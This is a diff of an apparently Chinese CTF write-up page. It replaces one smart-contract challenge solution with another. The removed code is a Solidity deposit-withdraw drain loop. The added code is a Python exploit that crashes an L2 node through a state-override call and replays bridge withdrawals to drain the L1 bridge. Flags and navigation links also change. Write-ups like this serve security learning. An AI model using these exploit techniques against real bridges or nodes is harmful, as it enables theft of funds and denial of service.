+<span class="n">svr</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;rpc endpoints:&quot;</span><span class="p">)</span>
+<span class="n">l1</span> <span class="o">=</span> <span class="n">Connection</span><span class="p">(</span><span class="n">svr</span><span class="o">.</span><span class="n">recvline_contains</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;l1&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;-&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<span class="n">l2</span> <span class="o">=</span> <span class="n">Connection</span><span class="p">(</span><span class="n">svr</span><span class="o">.</span><span class="n">recvline_contains</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;l2&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;-&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
 
-<span class="w">        </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">tokenStore</span><span class="p">),</span><span class="w"> </span><span class="nx">type</span><span class="p">(</span><span class="nx">uint256</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">tokenStore</span><span class="p">.</span><span class="nx">withdrawToken</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="nx">tokenStore</span><span class="p">.</span><span class="nx">tokens</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="nx">player</span><span class="p">));</span>
-<span class="w">        </span><span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nx">challenge</span><span class="p">.</span><span class="nx">isSolved</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="nx">tokenStore</span><span class="p">.</span><span class="nx">depositToken</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">player</span><span class="p">));</span>
-<span class="w">            </span><span class="nx">tokenStore</span><span class="p">.</span><span class="nx">withdrawToken</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="nx">tokenStore</span><span class="p">.</span><span class="nx">tokens</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="nx">player</span><span class="p">));</span>
-<span class="w">        </span><span class="p">}</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="p">}</span>
+<span class="n">priv</span> <span class="o">=</span> <span class="n">svr</span><span class="o">.</span><span class="n">recvline_contains</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;private&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+<span class="n">setup</span> <span class="o">=</span> <span class="n">svr</span><span class="o">.</span><span class="n">recvline_contains</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;challenge&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+<span class="n">svr</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="n">l1account</span> <span class="o">=</span> <span class="n">l1</span><span class="o">.</span><span class="n">account</span><span class="p">(</span><span class="n">priv</span><span class="p">)</span>
+<span class="n">l2account</span> <span class="o">=</span> <span class="n">l2</span><span class="o">.</span><span class="n">account</span><span class="p">(</span><span class="n">priv</span><span class="p">)</span>
+
+<span class="n">bridge</span> <span class="o">=</span> <span class="n">decode_data</span><span class="p">(</span>
+    <span class="n">l1account</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">setup</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">encode_with_signature</span><span class="p">(</span><span class="s2">&quot;BRIDGE()&quot;</span><span class="p">)),</span> <span class="p">[</span><span class="s2">&quot;address&quot;</span><span class="p">]</span>
+<span class="p">)</span>
+<span class="n">l1bridge</span> <span class="o">=</span> <span class="n">l1</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">l1account</span><span class="p">,</span> <span class="n">address</span><span class="o">=</span><span class="n">bridge</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">bridge_abi</span><span class="p">)</span>
+<span class="n">l2bridge</span> <span class="o">=</span> <span class="n">l2</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">l2account</span><span class="p">,</span> <span class="n">address</span><span class="o">=</span><span class="n">bridge</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">bridge_abi</span><span class="p">)</span>
+
+<span class="n">flag_token_addr</span> <span class="o">=</span> <span class="n">decode_data</span><span class="p">(</span>
+    <span class="n">l1account</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">setup</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">encode_with_signature</span><span class="p">(</span><span class="s2">&quot;FLAG_TOKEN()&quot;</span><span class="p">)),</span> <span class="p">[</span><span class="s2">&quot;address&quot;</span><span class="p">]</span>
+<span class="p">)</span>
+<span class="n">flag_token</span> <span class="o">=</span> <span class="n">l1</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">l1account</span><span class="p">,</span> <span class="n">address</span><span class="o">=</span><span class="n">flag_token_addr</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">flag_token_abi</span><span class="p">)</span>
+
+<span class="c1"># Transfer FlagTokens from L1 to L2</span>
+<span class="n">flag_token</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">approve</span><span class="p">(</span><span class="n">bridge</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="mf">1e18</span><span class="p">))</span><span class="o">.</span><span class="n">send_transaction</span><span class="p">()</span>
+<span class="n">l1bridge</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">ERC20Out</span><span class="p">(</span>
+    <span class="n">flag_token_addr</span><span class="p">,</span> <span class="n">l2account</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="mf">1e18</span><span class="p">)</span>
+<span class="p">)</span><span class="o">.</span><span class="n">send_transaction</span><span class="p">()</span>
+
+<span class="c1"># Waiting for message to be relayed</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">l2token</span> <span class="o">=</span> <span class="n">l2bridge</span><span class="o">.</span><span class="n">caller</span><span class="o">.</span><span class="n">remoteTokenToLocalToken</span><span class="p">(</span><span class="n">flag_token_addr</span><span class="p">)</span>
+
+<span class="c1"># Waiting for the latest state to be dumped</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+
+<span class="c1"># Transfer FlagTokens from L2 to L1</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+    <span class="n">balance</span> <span class="o">=</span> <span class="n">flag_token</span><span class="o">.</span><span class="n">caller</span><span class="o">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">bridge</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;FlagToken balance of l1Bridge: </span><span class="si">{</span><span class="n">balance</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">balance</span> <span class="o">&lt;</span> <span class="nb">int</span><span class="p">(</span><span class="mf">90e18</span><span class="p">):</span>
+        <span class="k">break</span>
+
+    <span class="n">l2balance</span> <span class="o">=</span> <span class="n">decode_data</span><span class="p">(</span>
+        <span class="n">l2account</span><span class="o">.</span><span class="n">call</span><span class="p">(</span>
+            <span class="n">l2token</span><span class="p">,</span>
+            <span class="n">data</span><span class="o">=</span><span class="n">encode_with_signature</span><span class="p">(</span><span class="s2">&quot;balanceOf(address)&quot;</span><span class="p">,</span> <span class="n">l2account</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
+        <span class="p">),</span>
+        <span class="p">[</span><span class="s2">&quot;uint256&quot;</span><span class="p">],</span>
+    <span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;FlagToken L2 balance of player: </span><span class="si">{</span><span class="n">l2balance</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="n">l2bridge</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">ERC20Out</span><span class="p">(</span>
+        <span class="n">l2token</span><span class="p">,</span> <span class="n">l1account</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="mf">5e17</span><span class="p">)</span> <span class="o">-</span> <span class="n">i</span>  <span class="c1"># avoid same relay message hash</span>
+    <span class="p">)</span><span class="o">.</span><span class="n">send_transaction</span><span class="p">()</span>
+
+    <span class="c1"># Waiting for message to be relayed</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="c1"># Kill the L2 node</span>
+            <span class="n">l2account</span><span class="o">.</span><span class="n">call</span><span class="p">(</span>
+                <span class="s2">&quot;0x0000000000000000000000000000000000031337&quot;</span><span class="p">,</span>
+                <span class="n">state_override</span><span class="o">=</span><span class="p">{</span>
+                    <span class="s2">&quot;0x0000000000000000000000000000000000031337&quot;</span><span class="p">:</span> <span class="p">{</span>
+                        <span class="c1"># address(1337).staticcall{gas: 2000}(abi.encodePacked(hex&quot;0204&quot;, new bytes(0x11)))</span>
+                        <span class="s2">&quot;code&quot;</span><span class="p">:</span> <span class="s2">&quot;0x6002600053600460015360006000601360006105396107d0fa&quot;</span>
+                    <span class="p">},</span>
+                <span class="p">},</span>
+            <span class="p">)</span>
+            <span class="k">continue</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="c1"># Waiting for L2 node to restart</span>
+            <span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+            <span class="k">break</span>
+
+<span class="n">svr</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+<span class="n">svr</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;action?&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
+<span class="n">svr</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
 <h3 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h3>
 <blockquote>
-<p>PCTF{f33_70K3nS_cauS1n9_pR08L3Ms_a9a1N}</p>
+<p>PCTF{57473_0V3RR1d35_90_8RR}</p>
 </blockquote>
+<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://stackoverflow.com/a/72642894/13542937">rust - Unexpected segfault when working with raw pointers - Stack Overflow</a></li>
+<li><a href="https://rustwiki.org/en/rust-by-example/primitives/array.html">Arrays and Slices - Rust By Example</a></li>
+<li><a href="https://doc.rust-lang.org/std/primitive.pointer.html#method.offset">pointer - Rust</a></li>
+<li><a href="https://docs.alchemy.com/reference/eth-call">eth_call - Ethereum</a></li>
+</ul>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年12月1日 21:22:46</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年12月21日 16:01:29</span>
       
     
   </small>
@@ -3807,7 +3899,7 @@
     <nav class="md-footer__inner md-grid" aria-label="页脚" >
       
         
-        <a href="../dai_plus_plus/" class="md-footer__link md-footer__link--prev" aria-label="上一页: Dai++" rel="prev">
+        <a href="../grains_of_sand/" class="md-footer__link md-footer__link--prev" aria-label="上一页: Grains of Sand" rel="prev">
           <div class="md-footer__button md-icon">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
           </div>
@@ -3816,20 +3908,20 @@
               <span class="md-footer__direction">
                 上一页
               </span>
-              Dai++
+              Grains of Sand
             </div>
           </div>
         </a>
       
       
         
-        <a href="../enterprise_blockchain/" class="md-footer__link md-footer__link--next" aria-label="下一页: Enterprise Blockchain" rel="next">
+        <a href="../../the_council_of_apes/" class="md-footer__link md-footer__link--next" aria-label="下一页: The Council of Apes" rel="next">
           <div class="md-footer__title">
             <div class="md-ellipsis">
               <span class="md-footer__direction">
                 下一页
               </span>
-              Enterprise Blockchain
+              The Council of Apes
             </div>
           </div>
           <div class="md-footer__button md-icon">
